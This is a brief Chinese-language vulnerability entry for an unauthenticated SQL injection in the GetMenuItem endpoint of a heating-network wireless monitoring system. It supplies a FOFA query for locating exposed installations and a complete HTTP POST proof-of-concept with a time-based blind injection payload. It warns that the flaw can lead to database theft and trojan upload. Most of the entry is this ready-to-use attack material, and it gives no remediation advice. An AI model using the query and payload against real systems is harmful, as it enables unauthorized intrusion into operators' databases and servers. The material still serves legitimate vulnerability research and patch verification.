## 热网无线监测系统GetMenuItem存在SQL注入漏洞

热网无线监测系统 GetMenuItem 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
```

## poc

```javascript
POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
name=1') waitfor delay '0:0:5'-- +
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409081939869.png)